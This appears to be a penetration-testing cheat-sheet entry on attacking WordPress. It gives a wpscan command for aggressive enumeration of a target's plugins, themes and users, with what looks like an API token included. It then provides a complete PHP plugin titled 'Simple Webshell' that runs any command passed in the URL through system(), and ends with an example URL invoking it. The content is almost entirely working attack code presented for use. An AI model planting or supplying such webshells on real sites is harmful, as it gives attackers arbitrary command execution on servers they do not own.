# WordPress

```bash
wpscan --no-update --url http://192.168.110.244/ --random-user-agent -v \
  --api-token ajdZfYu1QPaKraHyM377YAWilYpG0xPk8QTSw5e9B3k \
  --enumerate vp,vt,cb,u,m \
  --plugins-detection aggressive | tee -a wpscan.txt
```

#### WordPress Plugin

```php
NAME: plugin.php
<?php
/**
 * Plugin Name: Simple Webshell
 * Description: A minimal WordPress webshell
 * Version: 1.0
 * Author: misthos
 */
echo system($_GET[cmd]); 
?>
```

```
http://<ip-address>/wordpress/wp-content/plugins/plugin.php?cmd=whoami
```
